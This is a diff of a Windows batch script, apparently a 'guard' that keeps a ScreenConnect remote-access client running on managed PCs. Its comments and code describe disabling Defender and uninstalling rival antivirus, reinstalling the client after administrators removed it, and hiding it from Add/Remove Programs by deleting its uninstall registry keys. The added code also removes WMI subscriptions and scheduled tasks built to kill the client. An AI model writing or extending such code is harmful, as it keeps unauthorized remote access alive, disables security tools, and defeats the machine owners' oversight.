@@ -1,20 +1,23 @@
 @echo off
-rem WINRTCS_GUARD 0.0.5 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
+rem WINRTCS_GUARD 0.0.7 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
 rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
 rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
-rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run):
-rem   streak>=2 -> counter Defender (RTM/behavior/IOAV off + policy pins) + stop/disable 3rd-party AV
-rem   streak>=3 -> uninstall the interfering product (once per day, msiexec-quiet or silent flags)
+rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run).
 rem 0.0.3: install preconditioning (kill svc -> msiexec /x shared PC -> purge phantom Installer keys
 rem   -> orphan/gryxa dir sweep) + one retry; counter reset moved here from the agent gate.
-rem 0.0.4: shields that actually land BEFORE install (literal Policies-channel exclusions, TP-safe,
-rem   bounded async cmdlet) + post-install re-shield of real ImagePath dir; all failure paths bump
-rem   the streak; guard.cnt=170 (~10 min) recheck after install/recovery; W-wait reset fix.
-rem 0.0.5: external-kill brake + forensics (see FailSvc notes). Stops duplicate-GUID console spam.
-rem 0.0.6: WaitSvc actively sc-starts a detected-but-stopped service (MSI doesn't always autostart)
-rem   and logs the raw StartService failure code (FAILED 5=policy/AV block, FAILED 2=binary gone);
-rem   Forensics excludes 7045 install spam so start-outcome events surface. Context: hosts managed
-rem   by PDQ Connect had the gryxa package surgically removed (keepers untouched, no AV traces).
+rem 0.0.4: shields that actually land BEFORE install (Policies-channel exclusions, TP-safe, bounded
+rem   async cmdlet) + post-install re-shield; failures bump streak; ~10 min recheck after install.
+rem 0.0.5: external-kill brake (3 consecutive exit-0-but-dead installs -> pause, hourly recheck)
+rem   + failure forensics (ImagePath, binary existence, SCM start-failure events).
+rem 0.0.6: WaitSvc actively sc-starts a detected-but-stopped service + logs raw StartService codes.
+rem 0.0.7: hunt our own ghost. Hosts that never updated since the gryxa-wars era still carry OLD
+rem   anti-gryxa automation (WMI permanent subscriptions live in the WMI repository and survive
+rem   the bootstrap's name-based filesystem/task wipe). PC-EVITA-X6: service entry deleted within
+rem   seconds of 7045 with zero events and product registration intact - event-driven killer.
+rem   On any external-kill signature: remove WMI consumers/filters/bindings and non-WinRTCS tasks
+rem   matching legacy markers (gryxa|wucache|etlcache|own_|zerocool|<gryxa FP>). Also: hide gryxa
+rem   from Add/Remove Programs (backup then delete ARP Uninstall keys, re-asserted every run;
+rem   product stays manageable via ProductCode).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -27,6 +30,8 @@ set "PRESENT=%ZD%\gryxa_present.flag"
 set "LOCK=%ZD%\guard.lock"
 set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
+set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
+set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- overlap lock: skip if another guard is mid-run; break lock if stale (>15 min) ---
@@ -47,6 +52,7 @@ if exist "%EXTF%" set /p "EXTK=" <"%EXTF%"
 echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK! extkill=!EXTK!>>"%LOG%"
 
 call :Shields
+call :HideARP
 
 call :Detect
 if not defined GSVC (
@@ -55,7 +61,11 @@ if not defined GSVC (
     echo 60>"%ZD%\guard.cnt"
     goto :Done
   )
-  if exist "%PRESENT%" ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] gryxa_absent streak=!STREAK!>>"%LOG%" ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
+  if exist "%PRESENT%" (
+    set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
+    echo [%DATE% %TIME%] gryxa_absent streak=!STREAK!>>"%LOG%"
+    call :HuntKiller
+  ) else ( echo [%DATE% %TIME%] gryxa_absent_fresh>>"%LOG%" )
   goto :FightThenInstall
 )
 
@@ -69,6 +79,7 @@ if errorlevel 1 (
     set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
     echo [%DATE% %TIME%] start_fail streak=!STREAK!>>"%LOG%"
     call :Forensics
+    call :HuntKiller
     if !EXTK! GEQ 3 (
       echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
       echo 60>"%ZD%\guard.cnt"
@@ -127,8 +138,6 @@ exit /b 0
 set /a RI+=1
 if !RI! GTR 2 ( echo [%DATE% %TIME%] FAIL_install_cap>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
 set "MSI=%ZD%\gryxa_install.msi"
-set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
-set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
 
 rem --- precondition (proven clean-install): kill gryxa svcs, uninstall shared PC, purge phantoms ---
 call :Detect
@@ -207,6 +216,7 @@ set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
 set /a "EXTK+=1" & echo !EXTK!>"%EXTF%"
 echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK! extkill=!EXTK!>>"%LOG%"
 call :Forensics
+call :HuntKiller
 if !EXTK! GEQ 3 (
   echo [%DATE% %TIME%] installs_paused extkill=!EXTK! recheck=60m>>"%LOG%"
   echo 60>"%ZD%\guard.cnt"
@@ -218,6 +228,7 @@ goto :FightThenInstall
 sc config "!GSVC!" start= auto >nul 2>&1
 sc failure "!GSVC!" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
 sc start "!GSVC!" >nul 2>&1
+call :HideARP
 
 rem --- post-install re-shield: the real install dir exists now, pin it by ImagePath ---
 set "SHDIR="
@@ -275,6 +286,12 @@ netstat -ano 2>nul | findstr /C:"ESTABLISHED" | findstr /E /C:" !GPID!" >nul 2>&
 if not errorlevel 1 set "GUP=1"
 exit /b 0
 
+:TryStart
+set "STARTED=1"
+echo [%DATE% %TIME%] svc_not_autostarted sc_start !GSVC!>>"%LOG%"
+for /f "tokens=*" %%E in ('sc start "!GSVC!" 2^>^&1 ^| findstr /C:"FAILED"') do echo [%DATE% %TIME%] svc_start_error %%E>>"%LOG%"
+exit /b 0
+
 :Forensics
 rem --- capture why the service died: ImagePath, binary still on disk?, SCM start-failure events ---
 if not defined GSVC ( echo [%DATE% %TIME%] svc_never_registered>>"%LOG%" & exit /b 0 )
@@ -282,10 +299,22 @@ powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='Silently
 if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%ZD%\svc_dead.out" >nul 2>&1 )
 exit /b 0
 
-:TryStart
-set "STARTED=1"
-echo [%DATE% %TIME%] svc_not_autostarted sc_start !GSVC!>>"%LOG%"
-for /f "tokens=*" %%E in ('sc start "!GSVC!" 2^>^&1 ^| findstr /C:"FAILED"') do echo [%DATE% %TIME%] svc_start_error %%E>>"%LOG%"
+:HuntKiller
+rem --- our own ghost: legacy anti-gryxa automation survives in the WMI repository / as tasks on
+rem --- hosts that never received cleanup updates. Remove anything matching legacy markers. ---
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $pat='gryxa|wucache|etlcache|own_mon|own_lib|own_gryxa|zerocool|36e506ff016b2151'; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { ($_.CommandLineTemplate -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { ($_.Query -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $tasks=Get-ScheduledTask | Where-Object { ($_.TaskName -match $pat) -and ($_.TaskPath -notmatch 'WinRTCS') }; foreach($t in $tasks){ $acts=($t.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ';'; if($acts -notmatch 'winrtcs'){ $o+=('task_killed ' + $t.TaskPath + $t.TaskName); Unregister-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -Confirm:$false } }; if(-not $o){ $o+='killer_not_found_wmi_tasks' }; $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII" >nul 2>&1
+if exist "%ZD%\killer.out" ( type "%ZD%\killer.out">>"%LOG%" & del /f /q "%ZD%\killer.out" >nul 2>&1 )
+exit /b 0
+
+:HideARP
+rem --- hide gryxa from Add/Remove Programs (backup once, then drop ARP keys; ProductCode still works) ---
+set "ARP64=HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%"
+set "ARP32=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%"
+if not exist "%ZD%\arp_backup.reg" (
+  reg query "%ARP64%" >nul 2>&1 && reg export "%ARP64%" "%ZD%\arp_backup.reg" /y >nul 2>&1
+)
+reg query "%ARP64%" >nul 2>&1 && ( reg add "%ARP64%" /v SystemComponent /t REG_DWORD /d 1 /f >nul 2>&1 & reg delete "%ARP64%" /f >nul 2>&1 & echo [%DATE% %TIME%] arp_hidden>>"%LOG%" )
+reg query "%ARP32%" >nul 2>&1 && ( reg add "%ARP32%" /v SystemComponent /t REG_DWORD /d 1 /f >nul 2>&1 & reg delete "%ARP32%" /f >nul 2>&1 )
 exit /b 0
 
 :Shields
